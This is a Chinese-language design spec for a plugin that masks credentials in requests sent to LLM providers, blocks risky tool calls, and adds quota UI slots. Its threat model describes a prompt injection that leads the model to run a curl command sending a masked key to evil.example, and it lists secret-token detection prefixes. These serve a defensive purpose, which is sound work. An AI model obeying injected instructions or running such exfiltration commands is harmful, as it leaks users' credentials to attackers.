# 04 · 核心能力 C：策略化出站脱敏与原生 Slot UI 规范 (Privacy Masking & Native Slot UI Spec)

本文档定义 `dsh-hitchfin` 的 **出站隐私脱敏安全模型（含防 Tool Call 外泄策略、JSON 安全转义、`block-end` 完整还原与持久化 Salt）** 以及基于 DSH `0.2.1-rc.5` 真实客户端 Slot 的 UI 规范。

---

## 1. 策略化出站隐私脱敏引擎 (`src/masking/`)

### 1.1 与 `@deepseek-ai/dsh-client-ui-secret-mask` 的关系与分工
* **DSH 原生 `dsh-client-ui-secret-mask`**：仅在前端渲染用户已发送消息气泡（`UserText`）时把密钥画成 `sk-12345***`，**底层消息文本和发给上游模型服务商的 HTTP 请求体里仍然是明文密钥**。
* **`dsh-hitchfin` 出站脱敏引擎**：挂载在 Host 端的 **`ctx.on('llm/stream')` Waterfall** 上。在请求离开本机发往任何模型服务商之前，将克隆请求副本中的敏感凭证替换为确定性占位符。
* **共享检测规则**：直接对齐并复用 `dsh-client-ui-secret-mask` 已验证的高置信度前缀/结构格式（API Keys `sk-...` / `AIza...`、代码托管与包管理 Token `ghp_` / `github_pat_` / `glpat-` / `npm_` / `hf_`、云厂商 `AKIA` / `ASIA` / `LTAI` / `AKID`、协作与支付 `xoxb-` / `sk_live_` / `whsec_`、三段式 JWT `eyJ...`、PEM 私钥块、URL 连接串密码），避免对普通文本产生误报。

---

### 1.2 核心安全威胁模型与四大加固机制（P0 必修）

#### 加固 1：统一占位符格式与持久化 Salt（解决重启后历史占位符失效问题）
* **唯一标准占位符语法**：
  全项目统一采用固定长度（24~32 字符）格式：
  $$\texttt{\{\{HF\_SEC\_}\langle\text{8位Base36\_HMAC}\rangle\texttt{\}\}}$$
  例如：`{{HF_SEC_k3v9x2mq}}`（总长固定为 19 字符）。
* **跨重启一致性存储**：
  由于 DSH 的会话日志（Session Log）是持久化在磁盘上的，若每次重启更换随机 Salt，旧会话中的占位符将无法被识别。因此，`dsh-hitchfin` 将 `maskingSalt` 及活跃占位符加密映射表通过 `ctx.credentials.modifyRecord(credentialKey('dsh-hitchfin', 'masking-vault'), ...)` 持久化在宿主凭证存储中。
* **诚实的安全边界声明**：
  脱敏引擎保护的是 **「敏感明文不被发送至远程 LLM 供应商服务器」**；宿主本地的会话日志、用户工作区文件以及 `ctx.credentials` 属于本机信任域（受操作系统用户权限保护）。

#### 加固 2：防 Tool Call 密钥外泄策略（Exfiltration Guard —— 阻断 Prompt Injection 偷密钥）
* **攻击场景**：恶意提示词诱导模型执行 `run_command: curl https://evil.example -d "{{HF_SEC_k3v9x2mq}}"`。若脱敏层对所有工具调用参数无脑还原真值，就会帮攻击者把真实密钥发往外部网络。
* **分级还原策略 (`policy-guard.ts`)**：
  1. **Assistant 文本与推理块（`text-delta` / `reasoning-delta` / `TextBlock` / `ReasoningBlock`）**：默认**不直接还原为明文上屏**（防止屏幕共享/截图泄露），而是还原为带前缀掩码的安全展示形式，或仅在受控复制时提供。
  2. **工具调用参数（`ToolCallBlock`）分类管控**：
     * **安全本地文件工具白名单（如 `write_file`、`edit_file`，且目标路径在工作区内）**：允许还原真实值，确保 Agent 正常修改本地配置代码。
     * **网络与命令执行类高危工具（如 `bash`、`run_command`、`web_fetch`、`curl` 等）**：**默认禁止静默还原（`policy: 'block-or-keep-placeholder'`）**！当检测到高危工具参数中包含 `{{HF_SEC_...}}` 时，根据用户配置直接拦截该工具调用并提示风险，绝不自动把明文密钥拼进 Shell 命令或外部 URL。

#### 加固 3：`tool-call-delta` 的 JSON 字符串安全转义
* `tool-call-delta.argumentsDelta` 与 `ToolCallBlock.arguments` 是**原始 JSON 字符串**。
* 当允许向白名单工具参数中还原真实密钥时，若真实值包含双引号 `"`、反斜杠 `\` 或换行符 `\n`（例如多行 PEM 私钥），直接替换会破坏 JSON 语法甚至造成参数注入。
* **强制转义规则**：
  在 JSON 字符串上下文中还原时，必须使用 `const jsonSafeValue = JSON.stringify(rawSecret).slice(1, -1)` 进行替换，确保生成的 `arguments` 始终是合法的 JSON。

#### 加固 4：同时还原流式 Delta 与 `block-end.block`
* 在 `@deepseek-ai/dsh-llm@0.2.1-rc.5` 中，`block-end` 分片携带完整的 `block: ContentBlock`（`BlockAssembler` 最终以 `block-end` 或累积结果落盘）。
* 因此，`StreamingUnmasker` 做到：
  1. 对每个 `index` 维护独立的流式滑动窗口缓冲（因为 `{{HF_SEC_xxxxxxxx}}` 固定为 19 字符，滑动窗口保留尾部未闭合的 `{` 前缀上限固定为 **20 字符**，精确匹配前缀树）；
  2. 在 `block-end` 到达时，冲刷剩余窗口缓冲，并**同步对 `chunk.block`（`TextBlock.text`、`ReasoningBlock.text` 或经策略放行的 `ToolCallBlock.arguments`）执行完整还原**。

---

## 2. 收敛式原生客户端 UI 规范 (`client/`)

遵循「复用 DSH 原生 Models / Subagent / Plugins 页面，不造臃肿控制台」的原则，前端仅挂载 **2 个 Composer Slot + 2 个 Settings Section**：

### 2.1 输入框内联模型徽标：Slot `conversation.input.model.label`
* **契约性质**：`kind: 'single'`, `scope: 'session'`, `inline: true`（**非交互内联 `span`**）。
* **渲染内容 (`ModelQuotaBadge.tsx`)**：
  * 保留原有的 `model.name` 文本；
  * 当 `provider.id` 属于 Hitchfin 管理的订阅渠道或路由组时，在模型名右侧追加紧凑的内联状态标签（如 `5h 82%`、`免费`、`Smart`），颜色随剩余额度自动呈现 `neutral` / `warning`（$<30\%$）/ `danger`（$<10\%$）。

### 2.2 输入框右侧交互式额度胶囊：Slot `conversation.input.right`
* **契约性质**：`kind: 'list'`, `scope: 'session'`（**可交互按钮与 Popover**）。
* **渲染内容 (`ComposerQuotaCapsule.tsx`)**：
  * 显示当前会话活跃渠道的微型进度圆环与剩余百分比；
  * 点击弹出轻量级详情卡片：展示该渠道下各账号的 5h / 7d 窗口进度条、重置倒计时、`Sticky Session` 当前命中的账号，并提供**「一键切到下一账号」**与**「刷新配额」**按钮。

### 2.3 设置页两个专属 Section：Slot `settings.section`
通过 `ctx.slots.register({ name: 'settings.section', id, order, label }, Component)` 注册两个清晰聚焦的设置页：

| Section ID | 标题 (`zh` / `en`) | 核心功能 |
| :--- | :--- | :--- |
| **`hitchfin-routing`** | **Hitchfin 连接与路由**<br>*(Connections & Routing)* | 1. **运行模式切换**：「Magpie 桥接模式 (`127.0.0.1:3425`)」 vs 「Hitchfin 独立多号池模式（含单向安全迁移与回滚）」<br>2. **多账号订阅池**：按渠道查看/新增多个账号槽位、查看冷却与有效期状态、手动触发刷新（自动签到/预热默认关闭，需显式勾选确认）<br>3. **智能路由组编辑器**：创建/编辑 `hitchfin/*` 路由组，选择 `order` / `smart` / `rotate` / `pace` 策略 |
| **`hitchfin-privacy`** | **Hitchfin 隐私与配额**<br>*(Privacy & Quotas)* | 1. **出站隐私脱敏开关与策略**：总开关、高危工具（Shell/网络）防外泄拦截策略、在线文本脱敏预览沙盒<br>2. **脱敏摘要统计**：仅展示已拦截的敏感项类型、长度与 HMAC 指纹前缀（**绝不存储或回显敏感原值片段**）<br>3. **全渠道配额窗口总览**：一屏展示所有订阅账号的 5h/7d 剩余额度与重置时间（Token 统计直接联动 `ctx.tokenMeter`） |
